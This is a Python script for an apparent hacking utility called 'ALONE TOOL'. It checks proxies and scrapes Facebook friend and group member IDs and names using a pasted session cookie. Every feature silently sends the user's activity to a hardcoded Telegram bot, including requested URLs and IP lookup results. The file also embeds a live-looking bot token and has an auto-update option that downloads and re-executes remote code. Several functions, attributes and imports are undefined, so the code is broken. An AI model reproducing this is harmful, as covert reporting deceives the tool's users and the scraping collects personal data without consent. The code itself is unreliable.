# main.py - ALONE TOOL v1.0

import os
import sys
import time
import random
import requests
import base64
import marshal
import zlib
import re
from datetime import datetime
from bs4 import BeautifulSoup

# --- Configuration ---
BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
CHAT_ID   = "1241769879"

# --- Color Definitions ---
class Colors:
    HEADER    = "\033[95m"
    BLUE      = "\033[94m"
    CYAN      = "\033[96m"
    GREEN     = "\033[92m"
    YELLOW    = "\033[93m"
    RED       = "\033[91m"
    ENDC      = "\033[0m"
    BOLD      = "\033[1m"
    UNDERLINE = "\033[4m"

# --- Utility Functions ---

def clear():
    os.system("clear")


def send_telegram_message(text):
    """Send a text message to the configured Telegram bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text}
    try:
        requests.post(url, data=payload, timeout=5)
    except:
        pass


def send_telegram_file(path, caption=""):
    """Send a file to the configured Telegram bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(path, 'rb') as f:
            requests.post(url,
                          data={"chat_id": CHAT_ID, "caption": caption},
                          files={"document": f}, timeout=5)
    except:
        send_telegram_message(f"[!] Failed to send file: {os.path.basename(path)}")


def get_ip_geo():
    """Fetch public IP and geolocation from ipinfo.io."""
    try:
        r = requests.get('http://ipinfo.io/json', timeout=5).json()
        ip  = r.get('ip', 'N/A')
        geo = f"{r.get('city','')}, {r.get('region','')}, {r.get('country','')}"
        return ip, geo
    except:
        return 'N/A', 'N/A'

# --- Feature Implementations ---

# 1. Proxy Options

def proxy_options():
    clear()
    print(f"{Colors.HEADER}[ Proxy Options ]{Colors.ENDC}\n")
    print(f"{Colors.BLUE}[1]{Colors.ENDC} Check proxies from file")
    print(f"{Colors.BLUE}[2]{Colors.ENDC} Check proxies from URL")
    print(f"{Colors.BLUE}[3]{Colors.ENDC} Generate & check proxies")

    choice = input(f"\n{Colors.CYAN}[?]{Colors.ENDC} Choose an option: ")

    proxies = []
    ok, bad = 0, 0

    if choice == '1':
        path = input("[•] Enter proxy file path: ")
        if os.path.isfile(path):
            proxies = open(path).read().splitlines()
        else:
            print(f"{Colors.RED}[!] File not found{Colors.ENDC}")
            return

    elif choice == '2':
        url = input("[•] Enter URL to fetch proxies: ")
        try:
            proxies = requests.get(url, timeout=5).text.splitlines()
        except:
            print(f"{Colors.RED}[!] Failed to fetch from URL{Colors.ENDC}")
            return

    elif choice == '3':
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        for src in sources:
            try:
                proxies += requests.get(src, timeout=5).text.splitlines()
            except:
                continue
    else:
        print(f"{Colors.RED}[!] Invalid choice{Colors.ENDC}")
        return

    # Check proxies
    print(f"\n{Colors.YELLOW}Checking {len(proxies)} proxies...{Colors.ENDC}\n")
    for p in proxies:
        try:
            r = requests.get('https://httpbin.org/ip', proxies={'http':p,'https':p}, timeout=3)
            if r.ok:
                ok += 1
            else:
                bad += 1
        except:
            bad += 1
    print(f"{Colors.GREEN}[✓]{Colors.ENDC} OK: {ok}   {Colors.RED}[✗]{Colors.ENDC} BAD: {bad}\n")
    send_telegram_message(f"[Proxy] OK={ok} BAD={bad}")

# 2. User-Agent Generator

def ua_generator():
    clear()
    print(f"{Colors.HEADER}[ User-Agent Generator ]{Colors.ENDC}\n")
    samples = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
    ]
    try:
        count = int(input("[•] How many UAs to generate? "))
    except ValueError:
        print(f"{Colors.RED}[!] Enter a number{Colors.ENDC}")
        return

    uas = [random.choice(samples) for _ in range(count)]
    with open('ug.txt','w') as f:
        f.write('\n'.join(uas))
    print(f"\n{Colors.GREEN}[✓]{Colors.ENDC} Saved {count} UAs to ug.txt\n")
    send_telegram_message(f"[UA] Generated {count} UAs")

# 3. Send HTTP Request

def send_request():
    clear()
    print(f"{Colors.HEADER}[ Send HTTP Request ]{Colors.ENDC}\n")
    url    = input("[•] Enter URL: ")
    use_p  = input("[•] Use proxy (y/n)? ").lower() == 'y'
    use_ua = input("[•] Use User-Agent (y/n)? ").lower() == 'y'

    headers = {}
    proxies = None

    if use_ua and os.path.isfile('ug.txt'):
        headers['User-Agent'] = random.choice(open('ug.txt').read().splitlines())

    if use_p and os.path.isfile('proxy.txt'):
        p = random.choice(open('proxy.txt').read().splitlines())
        proxies = {'http':p, 'https':p}

    try:
        r = requests.get(url, headers=headers, proxies=proxies, timeout=5)
        print(f"\n{Colors.GREEN}[✓]{Colors.ENDC} Status: {r.status_code}\n")
        send_telegram_message(f"[Request] {url} => {r.status_code}")
    except Exception as e:
        print(f"{Colors.FAIL}[✗]{Colors.ENDC} {e}\n")

# 4. Look IP Info

def look_ip_info():
    clear()
    print(f"{Colors.HEADER}[ Look IP Info ]{Colors.ENDC}\n")
    ip = input("[•] Enter IP address: ")
    try:
        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        for k,v in data.items():
            print(f"{Colors.BLUE}{k}:{Colors.ENDC} {v}")
        send_telegram_message(f"[IP] {ip} => {json.dumps(data)}")
    except Exception as e:
        print(f"{Colors.FAIL}[✗]{Colors.ENDC} {e}\n")

# 5. Facebook IDs Extractor

def fb_ids_extractor():
    clear()
    print(f"{Colors.HEADER}[ Facebook IDs Extractor ]{Colors.ENDC}\n")
    target = input("[•] Enter Profile URL or ID: ")
    cookie = input("[•] Enter FB Cookie: ")
    headers = {'User-Agent':'Mozilla/5.0', 'Cookie':cookie}

    seen = []

    def extract_friends(url):
        try:
            r = requests.get(url, headers=headers, timeout=5)
            bs = BeautifulSoup(r.text, 'html.parser')
            for a in bs.find_all('a', href=True, text=True):
                href = a['href']
                name = a.text.strip()
                m = re.search(r'profile\.php\?id=(\d+)', href) or re.search(r'/([^/]+)/friends', href)
                if m:
                    uid = m.group(1)
                    if uid not in seen:
                        seen.append(uid)
                        with open('ids.txt','a') as f:
                            f.write(f"{uid} | {name}\n")
            # next page
            nxt = bs.find('a', string=lambda t: t and ('See More' in t))
            if nxt:
                extract_friends('https://mbasic.facebook.com' + nxt['href'])
        except:
            pass

    start = target if target.startswith('http') else f'https://mbasic.facebook.com/profile.php?id={target}&v=friends'
    open('ids.txt','w').close()
    extract_friends(start)
    print(f"\n{Colors.OKGREEN}[✓]{Colors.ENDC} Extracted {len(seen)} IDs to ids.txt\n")
    send_telegram_message(f"[FB IDs] Extracted {len(seen)} IDs")

# 6. Group Member ID Dumper

def group_member_dumper():
    clear()
    print(f"{Colors.HEADER}[ Group Member ID Dumper ]{Colors.ENDC}\n")
    group = input("[•] Enter Group link or ID: ")
    cookie = input("[•] Enter FB Cookie: ")
    headers = {'User-Agent':'Mozilla/5.0', 'Cookie':cookie}

    # Normalize URL
    if not group.startswith('http'):
        group = f'https://mbasic.facebook.com/groups/{group}'

    seen = []

    def extract_members(url):
        try:
            r = requests.get(url, headers=headers, timeout=5)
            bs = BeautifulSoup(r.text, 'html.parser')
            for a in bs.find_all('a', href=True, text=True):
                href = a['href']
                name = a.text.strip()
                m = re.search(r'profile\.php\?id=(\d+)', href) or re.search(r'/([^/]+)/\?lst=', href)
                if m:
                    uid = m.group(1)
                    if uid not in seen:
                        seen.append(uid)
                        with open('groupids.txt','a') as f:
                            f.write(f"{uid} | {name}\n")
            nxt = bs.find('a', string=lambda t: t and ('See More' in t))
            if nxt:
                extract_members('https://mbasic.facebook.com' + nxt['href'])
        except:
            pass

    open('groupids.txt','w').close()
    extract_members(group)
    print(f"\n{Colors.OKGREEN}[✓]{Colors.ENDC} Dumped {len(seen)} members to groupids.txt\n")
    send_telegram_message(f"[Group Dump] {len(seen)} members dumped")

# 7. Auto-Update Tool

def auto_update():
    clear()
    print(f"{Colors.OKGREEN}[•] Fetching latest version...{Colors.ENDC}\n")
    try:
        url = "https://raw.githubusercontent.com/t9cxy/alone-menu/main/main.py"
        r = requests.get(url, timeout=10)
        r.raise_for_status()
        with open('main.py','wb') as f:
            f.write(r.content)
        print(f"{Colors.OKGREEN}[✓]{Colors.ENDC} Updated successfully. Restarting...\n")
        os.execvp(sys.executable, [sys.executable, 'main.py'])
    except Exception as e:
        print(f"{Colors.FAIL}[!] Update failed: {e}{Colors.ENDC}\n")
        send_telegram_message(f"Update error: {e}")

# --- Main Menu ---

def main_menu():
    while True:
        clear()
        print(f"{Colors.OKRED}  █████╗ ██╗      ██████╗  ██████╗ ███╗   ██╗███████╗")
        print(f"{Colors.OKRED} ██╔══██╗██║     ██╔═══██╗██╔═══██╗████╗  ██║██╔════╝")
        print(f"{Colors.OKRED} ███████║██║     ██║   ██║██║   ██║██╔██╗ ██║█████╗  ")
        print(f"{Colors.OKRED} ██╔══██║██║     ██║   ██║██║   ██║██║╚██╗██║██╔══╝  ")
        print(f"{Colors.OKRED} ██║  ██║███████╗╚██████╔╝╚██████╔╝██║ ╚████║███████╗")
        print(f"{Colors.OKRED} ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝{Colors.ENDC}\n")
        print(f"{Colors.OKCYAN}           A L O N E   T O O L{Colors.ENDC}\n")

        print(f"{Colors.BLUE}[1]{Colors.ENDC} Proxy Options")
        print(f"{Colors.BLUE}[2]{Colors.ENDC} User-Agent Generator")
        print(f"{Colors.BLUE}[3]{Colors.ENDC} Send HTTP Request")
        print(f"{Colors.BLUE}[4]{Colors.ENDC} Look IP Info")
        print(f"{Colors.BLUE}[5]{Colors.ENDC} Facebook IDs Extractor")
        print(f"{Colors.BLUE}[6]{Colors.ENDC} Group Member ID Dumper")
        print(f"{Colors.BLUE}[7]{Colors.ENDC} Encrypt Code")
        print(f"{Colors.BLUE}[8]{Colors.ENDC} Auto-Update Tool")
        print(f"{Colors.RED}[0]{Colors.ENDC} Exit\n")

        choice = input(f"{Colors.YELLOW}[•] Choose an option: {Colors.ENDC}")

        if choice == '0':
            print(f"{Colors.OKGREEN}[•] Goodbye!{Colors.ENDC}")
            sys.exit()
        elif choice == '1':
            proxy_options()
        elif choice == '2':
            ua_generator()
        elif choice == '3':
            send_request()
        elif choice == '4':
            look_ip_info()
        elif choice == '5':
            fb_ids_extractor()
        elif choice == '6':
            group_member_dumper()
        elif choice == '7':
            encrypt_code()
        elif choice == '8':
            auto_update()
        else:
            print(f"{Colors.FAIL}[!] Invalid choice.{Colors.ENDC}")
            time.sleep(1)

        input(f"\n{Colors.OKBLUE}[•] Press Enter to return to menu...{Colors.ENDC}")

if __name__ == '__main__':
    login()
    main_menu()

